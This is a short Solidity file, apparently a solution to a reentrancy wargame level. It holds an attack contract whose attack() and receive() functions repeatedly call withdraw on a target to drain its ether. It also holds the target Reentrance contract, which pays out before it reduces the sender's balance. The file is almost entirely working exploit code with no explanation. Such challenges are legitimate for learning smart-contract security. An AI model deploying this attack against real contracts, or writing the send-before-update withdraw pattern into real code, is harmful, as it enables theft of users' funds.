// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract ReEntrancySol{
    Reentrance targetContract;
    constructor (address payable _targetContract){
        targetContract = Reentrance(_targetContract);
    }

    function attack() public payable {
        targetContract.donate{value: msg.value}(address(this));
        targetContract.withdraw(100000000000000);
    }

    receive() external payable{
        targetContract.withdraw(100000000000000);
    }
}

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}